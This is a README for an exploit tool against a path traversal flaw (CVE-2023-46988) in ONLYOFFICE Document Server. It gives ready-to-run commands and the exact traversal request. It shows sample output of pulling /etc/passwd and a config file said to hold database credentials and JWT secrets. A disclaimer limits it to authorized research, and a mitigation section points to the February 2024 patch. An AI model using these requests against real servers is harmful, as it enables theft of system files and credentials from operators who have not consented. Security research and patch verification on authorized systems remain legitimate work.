# ONLYOFFICE Path Traversal Exploit (CVE-2023-46988)

## 📌 Overview

This script exploits a **path traversal vulnerability** in **ONLYOFFICE Document Server** (**CVE-2023-46988**) that allows unauthorized users to **copy arbitrary files** from the server. The vulnerability exists in the `/example/editor` endpoint, where the `fileExt` parameter can be manipulated to access sensitive system and configuration files.

## ⚠️ Disclaimer

This tool is for **educational and authorized security research purposes only**.  
Unauthorized use against systems without **explicit permission** is illegal and unethical.

## 🛠 Features

- Retrieve **default sensitive files**:
  - `/etc/passwd`
  - `/etc/onlyoffice/documentserver/local.json` (contains **database credentials & JWT secrets**)
- Specify **any file path** to retrieve with the `--file` argument.
- Supports **optional proxying** for Burp Suite interception (`--proxy`).
- Supports **optional SSL verification** (`--verify`).
- **Fixes encoding issues** when downloading files with special characters.

## 🚀 Usage

### **1️⃣ Basic Usage (Retrieve Default Files)**

```bash
python onlyoffice_exploit.py http://localhost
```

This retrieves:
- `/etc/passwd`
- `/etc/onlyoffice/documentserver/local.json`

### **2️⃣ Retrieve a Custom File (e.g., `/etc/hosts`)**

```bash
python onlyoffice_exploit.py http://localhost --file /etc/hosts
```

### **3️⃣ Enable Proxy (e.g., Burp Suite on `127.0.0.1:8080`)**

```bash
python onlyoffice_exploit.py http://localhost --proxy
```
```bash
python onlyoffice_exploit.py http://localhost --proxy http://127.0.0.1:8080
```

### **4️⃣ Enable SSL Verification**

```bash
python onlyoffice_exploit.py https://example.local --verify
```

### **5️⃣ Combine Proxy & SSL Verification**

```bash
python onlyoffice_exploit.py https://example.local --file /etc/hosts --proxy --verify
```

## 🔍 How It Works

1. **Sends a request** to `/example/editor` with a malicious `fileExt` parameter:
   ```
   GET /example/editor?fileExt=../../../../../../../../etc/passwd
   ```
2. **Extracts the redirect URL** from the response.
3. **Parses the redirected filename** from the response.
4. **Fixes encoding issues** for special characters in filenames.
5. **Downloads the file** from `/example/download?fileName=<extracted_filename>`.

## 🛠 Example Output

``` 
[*] Target URL: http://localhost
[*] Attempting to retrieve: /etc/passwd
[*] Sending request to: http://localhost/example/editor?fileExt=../../../../../../../../etc/passwd
[+] Extracted Redirect URL: http://localhost/example/download?fileName=.passwd
[+] Extracted File Name: .passwd
[*] Downloading file: http://localhost/example/download?fileName=.passwd
[+] File downloaded successfully: .passwd
```

## 🔒 Mitigation

ONLYOFFICE has patched this vulnerability in their **February 2024 update**.  
Users should **update to the latest version** to protect their servers.

## 🐜 License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.

